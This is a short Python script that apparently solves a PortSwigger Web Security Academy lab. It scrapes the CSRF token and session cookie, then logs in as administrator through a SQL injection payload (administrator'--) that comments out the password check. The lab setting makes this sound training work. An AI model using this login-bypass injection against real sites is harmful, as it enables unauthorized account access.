import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: SQL injection vulnerability allowing login bypass')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# Extraction of session and CSRF tokens needed for authentication.
r = requests.get('https://' + lab.id + '.web-security-academy.net/login')
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)

# Data to send within the payload
headers = { 'Cookie': f'session={r.cookies.get("session")}' }

data = {
    'csrf': f'{csrf}',
    'username': 'administrator\'--',
    'password': 'asd'
}

r = requests.post('https://' + lab.id + '.web-security-academy.net/login', headers=headers, data=data)
r = requests.get('https://' + lab.id + '.web-security-academy.net/')

try:
    assert('<p>Solved</p>' in r.text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.") 
